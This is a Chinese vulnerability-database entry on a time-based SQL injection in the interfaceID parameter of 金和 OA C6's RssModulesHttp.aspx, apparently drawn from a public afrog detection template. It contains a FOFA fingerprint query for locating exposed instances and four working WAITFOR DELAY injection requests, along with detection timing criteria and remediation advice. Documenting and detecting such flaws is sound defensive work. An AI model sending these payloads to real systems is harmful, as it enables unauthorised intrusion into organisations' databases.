---
source: "https://github.com/zan8in/afrog/blob/93e56607188ccfa4b26bc529c7fa10c92696fdc1/pocs/afrog-pocs/vulnerability/jinher-c6-rssmoduleshttp-sqli.yaml"
title: "金和C6 RssModulesHttp interfaceID SQL 注入"
product: "金和C6"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知"
prerequisites: "未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA%20RssModulesHttp.aspx%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"金和网络-金和OA\""
id: "vw-82c96f6c726b85683aaa7c4a"
entity_id: "ve-82c96f6c726b85683aaa7c4a"
schema_version: "1"
source_url: "https://github.com/zan8in/afrog/blob/93e56607188ccfa4b26bc529c7fa10c92696fdc1/pocs/afrog-pocs/vulnerability/jinher-c6-rssmoduleshttp-sqli.yaml"
---

# 金和C6 RssModulesHttp interfaceID SQL 注入

## 条目说明

- 对象与具体问题：金和C6；RssModulesHttp interfaceID SQLi
- 版本、配置及部署条件：未知
- 认证与权限前提：未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 四次10/6秒差分与正常基线要求明确优于单延时
- 仍未核服务端根因/build/认证，不能将模板等同漏洞已验证
- 请求片段缺Host宜注明片段

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 漏洞描述

afrog 公开模板记录金和 OA C6 的 `RssModulesHttp.aspx` SQL 注入检测，输入位置为 `interfaceID`。

### 影响版本与前提

金和 OA C6；确切受影响版本、修复版本及不同部署的鉴权条件未知。来源模板的请求未提供业务登录凭据；这不等于所有部署均可未授权利用。

### 网络测绘

```text
app="金和网络-金和OA"
```

### 公开验证资料

以下请求摘自公开来源，主机名如有展示统一为 `example.invalid`；仅作为授权环境中的资料参考。

```http
GET /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:10%27-- HTTP/1.1

GET /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:6%27-- HTTP/1.1

GET /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:10%27-- HTTP/1.1

GET /C6/JHSoft.Web.WorkFlat/RssModulesHttp.aspx/?interfaceID=-1;WAITFOR+DELAY+%270:0:6%27-- HTTP/1.1
```

### 判定与证据边界

上游按 10 秒、6 秒、10 秒、6 秒发起四次请求；每次均要求 HTTP 200，10 秒组耗时在 10–12 秒，6 秒组耗时在 6–8 秒，并且四项同时成立。需再结合正常响应基线排除网络与负载波动。

本篇仅静态核对公开资料，未对目标发包，未运行利用工具，也未完成本地复现。

### 修复建议

向厂商核对当前安装版本与可用补丁，在完成修复前限制相关接口的访问。修复对应查询的输入拼接，使用参数化查询，并限制数据库账户权限。

### 参考来源

- [公开检测模板](https://github.com/zan8in/afrog/blob/93e56607188ccfa4b26bc529c7fa10c92696fdc1/pocs/afrog-pocs/vulnerability/jinher-c6-rssmoduleshttp-sqli.yaml)
